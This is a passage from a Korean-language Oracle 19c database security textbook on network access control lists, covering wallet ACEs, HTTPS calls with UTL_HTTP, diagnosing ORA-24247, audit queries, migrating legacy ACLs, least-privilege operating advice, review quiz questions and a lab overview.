@B 사용자 판정까지 보려면 이 결과의 호스트로 DBA_HOST_ACES를 이어 조회해 주체와 GRANT_TYPE을 확인한다.

@H2 4.7  지갑 접근 제어

@H3 4.7.1  지갑 ACE

@B HTTPS 호출에서 클라이언트 인증서를 제시하거나 지갑에 저장된 비밀번호 자격 증명을 쓰려면 지갑에 대한 ACE가 따로 필요하다.
@B `APPEND_WALLET_ACE`로 지갑 경로에 `use_client_certificates`, `use_passwords` 권한을 준다. 경로는 `file:/디렉터리` 형식이며 대소문자를 구분한다.
@B 호스트 ACE와 지갑 ACE는 별개다. HTTPS 서버에 접속하려면 호스트 ACE(http 또는 connect)도 함께 있어야 한다.
@B 조회는 DBA_WALLET_ACLS, DBA_WALLET_ACES, USER_WALLET_ACES로 한다. 지갑의 구조와 생성은 1장(SEPS)과 11장(TLS)에서 다룬다.

@CODE
BEGIN
  DBMS_NETWORK_ACL_ADMIN.APPEND_WALLET_ACE(
    wallet_path => 'file:/u01/app/oracle/admin/orcl/https_wallet',
    ace         => xs$ace_type(privilege_list => xs$name_list('use_client_certificates'),
                               principal_name => 'APP_USER',
                               principal_type => xs_acl.ptype_db));
END;
/
@END

@H3 4.7.2  HTTPS 호출의 구성 요소

@B UTL_HTTP로 HTTPS URL을 호출하려면 서버 인증서를 검증할 신뢰 인증서(CA 인증서)가 담긴 지갑이 필요하다. 세션에서 `UTL_HTTP.SET_WALLET`으로 지갑 경로를 지정한다.
@B 신뢰 인증서만 쓰는 일반적인 HTTPS 호출에는 호스트 ACE(http, 포트 443)가 필요하다.
@B 상대 서버가 클라이언트 인증서를 요구하는 상호 인증이라면 지갑에 클라이언트 인증서를 넣고 use_client_certificates 지갑 ACE를 추가한다.
@B 지갑에 저장한 사용자 이름·비밀번호로 HTTP 인증을 하려면 use_passwords 지갑 ACE가 필요하다.
@B 지갑 경로를 틀리면 ORA-29248(지갑 열기 실패) 같은 오류가 나고, 신뢰 인증서가 없으면 ORA-29024(인증서 검증 실패)가 난다. 둘 다 ACL과는 다른 단계의 문제다.

@CODE
DECLARE
  v VARCHAR2(4000);
BEGIN
  UTL_HTTP.SET_WALLET('file:/u01/app/oracle/admin/orcl/https_wallet');
  v := UTL_HTTP.REQUEST('https://pay.example.com/health');
END;
/
@END

@H2 4.8  오류와 진단

@TBL
오류 | 상황 | 확인할 것
ORA-24247 | ACL이 접속을 허용하지 않음 | USER_HOST_ACES, 호출에 쓴 호스트 문자열, 역할 활성화
ORA-29273 | UTL_HTTP 요청 실패(겉 오류) | 아래 줄의 실제 원인(ORA-24247, ORA-12541 등)
ORA-24244 | 잘못된 호스트·포트 지정 | resolve에 포트 지정, 포트 범위 겹침
ORA-01927 | 없는 ACE 제거 시도 | 추가할 때와 같은 호스트·포트·권한·granted
ORA-46212 | 같은 이름의 ACL 재생성(구버전 API) | DBA_HOST_ACLS의 기존 ACL
ORA-46114 | 없는 ACL 이름(구버전 API) | /sys/acls/ 이름 철자
@END

@B ORA-24247을 받으면 먼저 호출한 사용자로 USER_HOST_ACES를 본다. 원하는 호스트·포트·권한이 GRANTED로 있는지가 첫 확인 사항이다.
@B 행이 보이는데도 거부되면 호스트 문자열(이름과 IP), 포트, 권한 종류(http인데 UTL_TCP를 쓰는지)를 차례로 맞춰 본다.
@B 프로시저 안에서만 실패하면 역할로 받은 권한인지 확인한다. 정의자 권한 프로시저에서는 역할이 꺼진다.
@B ACL이 통과된 뒤의 실패는 네트워크 문제다. ORA-12541, ORA-12535 같은 연결 오류는 대상 서버, 방화벽, 포트 상태를 본다.

@B 특정 사용자에게 실제로 적용되는 호스트 ACE를 DBA가 확인하려면 사용자 자신과 그 사용자가 받은 역할을 주체로 하는 ACE를 함께 본다.

@CODE
SELECT a.host, a.lower_port, a.upper_port, a.principal, a.privilege, a.grant_type
  FROM dba_host_aces a
 WHERE a.principal = 'APP_USER'
    OR a.principal IN (SELECT granted_role FROM dba_role_privs
                        START WITH grantee = 'APP_USER'
                        CONNECT BY PRIOR granted_role = grantee)
 ORDER BY a.host, a.lower_port;
@END

@B 역할 계층을 따라 내려가므로 역할 안의 역할로 받은 권한도 나온다. 다만 세션에서 그 역할이 실제로 켜져 있는지는 이 조회로 알 수 없다.

@BP ORA-24247 진단 순서
호출한 사용자로 접속해 USER_HOST_ACES를 조회한다. 행이 없으면 ACE가 없는 것이다.
호출 코드가 쓰는 호스트 문자열과 포트를 확인해 USER_HOST_ACES의 HOST, LOWER_PORT, UPPER_PORT와 맞춘다.
사용하는 패키지와 권한 종류를 맞춘다. UTL_TCP·DBMS_LDAP는 connect, UTL_INADDR는 resolve가 필요하다.
프로시저 안에서만 실패하면 정의자 권한 프로시저에서 역할이 꺼진 것인지 확인한다.
STATUS가 DENIED인 행이 있으면 더 구체적인 호스트에 거부 ACE가 있는 것이다.
@END

@CASE 배치 메일이 어느 날부터 발송되지 않는다
야간 배치가 끝나면 UTL_MAIL로 결과 메일을 보내던 시스템이 DB 업그레이드 이후 메일을 보내지 않았다. 배치 로그에는 ORA-24247이 남아 있었다.
업그레이드 전 DB는 10g였고 당시에는 ACL이라는 개념이 없었다. 업그레이드 후 네트워크 접근이 기본 거부로 바뀌면서 메일 서버 접속이 막힌 것이다.
배치 계정에 메일 서버 호스트, 포트 25로 smtp 권한 ACE를 추가했다. connect가 아니라 smtp만 준 덕분에 같은 계정이 메일 서버의 다른 포트로 접속하는 일은 여전히 막혀 있다.
@END

@H2 4.9  네트워크 ACL 관련 데이터 딕셔너리 뷰

@TBL
뷰 | 내용
DBA_HOST_ACLS | 호스트·포트 범위별로 할당된 ACL. SELECT_CATALOG_ROLE 필요
DBA_HOST_ACES | 호스트별 ACE. 주체, 권한, GRANT_TYPE(GRANT·DENY), ACE_ORDER, 유효 기간
USER_HOST_ACES | 현재 사용자에게 적용되는 호스트 권한과 판정(GRANTED·DENIED). PUBLIC 조회 가능
DBA_WALLET_ACLS, DBA_WALLET_ACES | 지갑 경로별 ACL과 ACE
USER_WALLET_ACES | 현재 사용자의 지갑 권한
DBA_NETWORK_ACLS, DBA_NETWORK_ACL_PRIVILEGES | 11g 호환 뷰. 구버전 API로 만든 ACL 이름(/sys/acls/...)을 보여 줌
@END

@CODE
SYS@orcl> SELECT host, lower_port lo, upper_port hi, acl FROM dba_network_acls WHERE acl LIKE '%legacy%';

HOST                   LO         HI ACL
-------------- ---------- ---------- ----------------------------------------
oel7v9               8090       8090 /sys/acls/acl_legacy.xml

SYS@orcl> SELECT host, lower_port lo, ace_order ord, principal, privilege, grant_type
  2    FROM dba_host_aces WHERE host = 'oel7v9';

HOST                   LO        ORD PRINCIPAL  PRIVILEGE GRANT
-------------- ---------- ---------- ---------- --------- -----
oel7v9                             1 ACL_U1     RESOLVE   GRANT
oel7v9               8090          1 ACL_U3     CONNECT   GRANT
@END

@B 구버전 API로 만든 ACL도 DBA_HOST_ACES에서는 새 방식의 ACE와 같은 형식으로 보인다. 호스트 이름은 소문자로 저장되므로 조회 조건도 소문자로 쓴다.

@B 정기 점검은 DBA_HOST_ACES 하나로 대부분 해결된다. 호스트, 포트, 주체, 권한, 허용 여부를 한 행에 담는다.
@B 주체가 역할이면 DBA_ROLE_PRIVS로 그 역할을 가진 사용자를 이어서 본다.
@B 설치 직후부터 있는 ACE(예: `*`에 대한 GSMADMIN_INTERNAL·GGSYS의 resolve, localhost에 대한 ORACLE_OCM의 resolve)는 오라클 내부 구성 요소용이다. 점검에서 제외하고 지우지 않는다.

@CODE
SYS@orcl> SELECT host, NVL(TO_CHAR(lower_port), '-') || '~' || NVL(TO_CHAR(upper_port), '-') AS ports,
  2         principal, privilege, grant_type
  3    FROM dba_host_aces
  4   WHERE principal NOT IN ('GSMADMIN_INTERNAL', 'GGSYS', 'ORACLE_OCM')
  5   ORDER BY principal, host;
@END

@H2 4.10  설계와 적용 절차

@H3 4.10.1  도입 절차

@TBL
단계 | 작업 | 확인할 것
1 | 외부 호출 목록 작성 | 호출 패키지, URL의 호스트 문자열, 포트, 호출 계정
2 | 주체 결정 | 애플리케이션 계정 또는 역할. 정의자 권한 프로시저면 소유자
3 | 권한 결정 | http·smtp 우선, connect는 UTL_TCP·DBMS_LDAP가 필요할 때만
4 | APPEND_HOST_ACE | 호스트는 구체적으로, 포트는 실제 포트만
5 | 업무 계정으로 시험 | USER_HOST_ACES, 실제 호출
6 | 거부 시험 | 다른 포트·다른 호스트·다른 계정이 막히는지
7 | 점검 목록 등록 | DBA_HOST_ACES 정기 점검, 유효 기간 만료 항목 정리
@END

@B 6단계를 빼먹기 쉽다. 허용이 잘 되는 것만 보고 끝내면 와일드카드나 connect로 지나치게 넓게 연 것을 알아채지 못한다.
@B 외부 호출 목록은 애플리케이션 소스에서 UTL_HTTP, UTL_SMTP, UTL_TCP, UTL_MAIL, DBMS_LDAP, HttpUriType을 검색해 만든다. DBA_DEPENDENCIES에서 이 패키지를 참조하는 객체를 찾으면 DB 안의 호출 지점이 빠짐없이 나온다.
@B 호출 지점마다 호스트를 상수로 쓰는지, 설정 테이블에서 읽는지도 함께 적는다. 설정 테이블에서 읽는 코드는 테이블 값이 바뀌면 ACL도 함께 바꿔야 한다.
@B 업무 담당자가 ACL 등록을 요청할 때 1단계 항목을 채워 내도록 양식을 만든다. 호스트 문자열을 이름으로 쓸지 IP로 쓸지는 요청 단계에서 정한다.

@H3 4.10.2  구버전 ACL을 새 API로 옮기기

@B 11g 시절 만든 ACL이 남아 있는 DB는 DBA_NETWORK_ACLS에 /sys/acls/이름.xml 형식의 ACL이 보인다.
@B 옮기는 순서는 기존 ACE 확인, 새 API로 같은 권한 등록, 업무 계정 시험, 구버전 ACL 삭제다.
@B 새 API로 같은 호스트·같은 포트 범위에 덧붙이면 기존 ACL에 ACE가 추가될 수 있다. 구버전 ACL을 지우기 전에 DBA_HOST_ACES에서 새 ACE만으로 필요한 권한이 모두 남는지 확인한다.
@B DROP_ACL은 하위 호환용으로 남아 있어 구버전 ACL 정리에 그대로 쓸 수 있다.

@CODE
-- 1) 구버전 ACL의 내용 확인
SELECT acl, principal, privilege, is_grant FROM dba_network_acl_privileges
 WHERE acl LIKE '/sys/acls/%';
SELECT host, lower_port, upper_port, acl FROM dba_network_acls
 WHERE acl LIKE '/sys/acls/%';

-- 2) 같은 권한을 새 API로 등록한 뒤 업무 계정으로 시험
-- 3) 구버전 ACL 삭제
EXEC DBMS_NETWORK_ACL_ADMIN.DROP_ACL('test_acl_file.xml')
@END

@B 설치 때 오라클이 만든 /sys/acls/oracle-sysman-ocm-Resolve-Access.xml 같은 ACL은 옮기거나 지우지 않는다.

@H2 4.11  운영 시 주의점

@B `*`에 일반 사용자 권한을 주지 않는다. 모든 외부 호스트로 나갈 수 있는 통로가 된다.
@B 업체 서버의 IP가 바뀌면 IP로 등록한 ACE는 조용히 무효가 된다. 연동 업체의 주소 변경 공지를 받는 경로를 운영 절차에 넣고, 가능하면 업체가 보장하는 도메인 이름으로 등록한다.
@B 업그레이드, 다른 DB로의 이관 뒤에는 DBA_HOST_ACES를 원본과 비교한다. Data Pump 전체 이관에서 ACL이 기대와 다르게 옮겨지는 경우가 있어 이관 후 점검 항목에 넣는다.
@B 구버전 API로 만든 ACL과 새 API로 만든 ACE가 같은 호스트에 섞여 있으면 관리가 어렵다. 새 API로 다시 등록한 뒤 구버전 ACL은 DROP_ACL로 정리한다.
@B DB 서버의 OS 방화벽과 네트워크 장비 방화벽이 ACL과 별개로 존재한다. ACL이 허용해도 방화벽이 막으면 ORA-12535 같은 연결 오류가 난다.
@B ACL 변경은 즉시 반영되고 감사 기록이 남지 않는 구성이 많다. DBMS_NETWORK_ACL_ADMIN 호출을 Unified Auditing 정책으로 기록한다(13장).
@B 개발 DB에서 편의상 `*`에 connect를 열어 둔 설정이 운영 DB로 복제되지 않도록, 운영 반영 스크립트에 ACL 항목을 따로 관리한다.
@B 유효 기간을 둔 ACE는 기간이 지나도 행이 남는다. END_DATE가 지난 행을 정기적으로 정리한다.
@B 계정 삭제 절차에 "해당 계정이 주체인 ACE를 remove_empty_acl => TRUE로 먼저 제거"를 넣는다. 순서를 거꾸로 하면 빈 ACL이 남는다(4.3.5).
@B DBA_HOST_ACLS에는 있는데 DBA_HOST_ACES에 그 호스트의 행이 없으면 빈 ACL이다. 점검 조회에 포함해 SET_HOST_ACL(acl => NULL)로 정리한다.
@B 실습에서 띄운 시험용 HTTP 서버와 ACE는 실습 05에서 모두 철거한다.

@H2 4.12  요약

@B UTL_HTTP, UTL_TCP, UTL_SMTP, UTL_MAIL, UTL_INADDR, DBMS_LDAP, HttpUriType은 PUBLIC 실행 권한이 있어도 네트워크 ACL이 허용해야 외부에 접속한다. 허용이 없으면 ORA-24247이다.
@B 19c에서는 `APPEND_HOST_ACE`로 호스트(와 포트 범위)에 ACE를 덧붙이고 `REMOVE_HOST_ACE`로 뺀다. ACL은 자동으로 만들어지고, remove_empty_acl => TRUE면 빈 ACL도 지워진다.
@B ACE는 XS$ACE_TYPE으로 만들며 principal_type => xs_acl.ptype_db를 반드시 적는다. granted => FALSE면 거부 ACE다.
@B 권한은 http, http_proxy, smtp, connect, resolve, jdwp. connect가 가장 넓으므로 용도별 권한을 우선한다.
@B 포트 범위는 TCP 연결 권한에만 쓰고, resolve는 포트 없는 ACL에만 들어간다. 같은 호스트의 포트 범위는 겹칠 수 없다(ORA-24244).
@B 판정은 가장 구체적인 호스트, 같은 호스트에서는 포트 범위가 있는 ACL부터 한다. 이 순서를 이용해 넓게 허용하고 일부를 거부할 수 있다.
@B CREATE_ACL·ASSIGN_ACL 등 구버전 API는 디프리케이트됐지만 동작하며, 결과는 DBA_HOST_ACLS·DBA_HOST_ACES에 함께 보인다.
@B 점검은 DBA_HOST_ACES와 USER_HOST_ACES로 한다. 역할 ACE는 역할이 켜진 세션에서만 유효하다.

@H2 4.13  퀴즈

@QUIZ 문제 1
UTL_HTTP의 EXECUTE 권한이 PUBLIC에 있는 상태에서 ACE가 하나도 없는 사용자가 외부 URL을 호출했다. 결과는?
① 정상 응답을 받는다  ② ORA-29273과 ORA-24247이 난다  ③ ORA-01031이 난다  ④ ORA-24244가 난다
정답 ②. 실행 권한은 패키지 호출만 허용한다. 실제 접속은 네트워크 ACL이 판정하며 기본은 거부이므로 ORA-29273 아래에 ORA-24247이 나온다.
@END

@QUIZ 문제 2
HTTP 호출만 하는 애플리케이션 계정에 주기에 가장 알맞은 권한은?
① connect  ② resolve  ③ jdwp  ④ http
정답 ④. http는 UTL_HTTP와 HttpUriType의 요청만 허용한다. connect를 주면 같은 호스트·포트로 UTL_TCP 원시 연결까지 열려 필요 이상으로 넓어진다.
@END

@QUIZ 문제 3
APPEND_HOST_ACE로 resolve 권한을 주면서 lower_port => 8090을 지정했다. 결과는?
① ORA-24244가 난다  ② 8090 포트에 대해서만 이름 풀이가 허용된다  ③ 포트 인자가 무시되고 등록된다  ④ ORA-24247이 난다
정답 ①. resolve는 포트 범위가 없는 ACL에만 넣을 수 있다. 포트를 지정하면 ORA-24244: invalid host or port for access control list (ACL) assignment가 난다.
@END

@QUIZ 문제 4
172.16.225.*에 사용자 A의 http 허용 ACE가 있고, 172.16.225.50에 사용자 A의 http 거부 ACE가 있다. A가 http://172.16.225.50:8090/을 호출하면?
① 서브넷 허용이 먼저라 성공한다  ② 두 ACE가 충돌해 ORA-24244가 난다  ③ 더 구체적인 호스트의 거부가 먼저 판정되어 ORA-24247이 난다  ④ 포트가 없어 둘 다 무시된다
정답 ③. 판정은 가장 구체적인 호스트부터 한다. 172.16.225.50 ACL에 A에 대한 거부가 있으므로 서브넷 허용까지 가지 않는다.
@END

@QUIZ 문제 5
IP 172.16.225.50에 http ACE를 받은 사용자가 같은 서버를 가리키는 이름으로 http://oel7v9:8090/을 호출했다. 결과와 이유로 옳은 것은?
① 성공한다. 이름이 IP로 풀리기 때문이다  ② ORA-24247이 난다. ACL은 호출에 쓴 호스트 문자열로 판정하기 때문이다  ③ ORA-24244가 난다. 이름과 IP가 겹치기 때문이다  ④ resolve 권한만 있으면 성공한다
정답 ②. ACL은 URL에 적힌 호스트 문자열을 기준으로 찾는다. oel7v9로 등록된 ACE가 없으므로 거부된다. 이름과 IP를 모두 쓰면 둘 다 등록한다.
@END

@QUIZ 문제 6
역할 WEB_ROLE에 http ACE를 주고 사용자에게 그 역할을 기본 역할로 부여했다. 이 사용자가 소유한 정의자 권한 프로시저 안에서 UTL_HTTP를 호출했을 때 거부된 이유로 가장 알맞은 것은?
① 정의자 권한 프로시저에서는 역할이 비활성화된다  ② 역할에는 ACE를 줄 수 없다  ③ 프로시저 안에서는 ACL이 무시된다  ④ 기본 역할은 ACL 판정에서 제외된다
정답 ①. 정의자 권한 프로시저 안에서는 역할이 꺼진 상태로 실행되므로 역할 ACE가 적용되지 않는다. 프로시저 소유자에게 직접 ACE를 준다.
@END

@H2 4.14  실습 개요

@P 실습은 oel7v9 서버의 orcl 데이터베이스(19.3, non-CDB)에서 진행한다. 접속 대상은 같은 서버에 python 내장 서버로 띄운 시험용 HTTP 서버(172.16.225.50:8090)다. 01에서 만든 사용자와 ACE를 04까지 이어 쓰고, 05에서 시험용 서버까지 모두 철거한다.

@TBL
실습 파일 | 확인하는 개념 | 관련 절
4장_실습_01_UTL_HTTP와ORA-24247 | PUBLIC 실행 권한과 ACL의 관계, ORA-24247, APPEND_HOST_ACE, DBA_HOST_ACLS | 4.2, 4.3.1
4장_실습_02_권한종류와포트범위 | http와 connect의 차이, resolve와 포트(ORA-24244), 포트 범위 겹침, 이름과 IP | 4.4, 4.5
4장_실습_03_와일드카드우선순위와거부 | 서브넷 와일드카드, DOMAINS 검색 순서, 거부 ACE, USER_HOST_ACES, REMOVE_HOST_ACE | 4.6, 4.3.3
4장_실습_04_역할부여와구버전API | 역할 ACE와 SET ROLE NONE, CREATE_ACL·ASSIGN_ACL, ORA-46212, 신구 뷰 비교 | 4.4.2, 4.3.4
4장_실습_05_점검과원복 | 점검 조회, ORA-01927·ORA-46114, 철거와 원복 확인 | 4.8, 4.9
@END
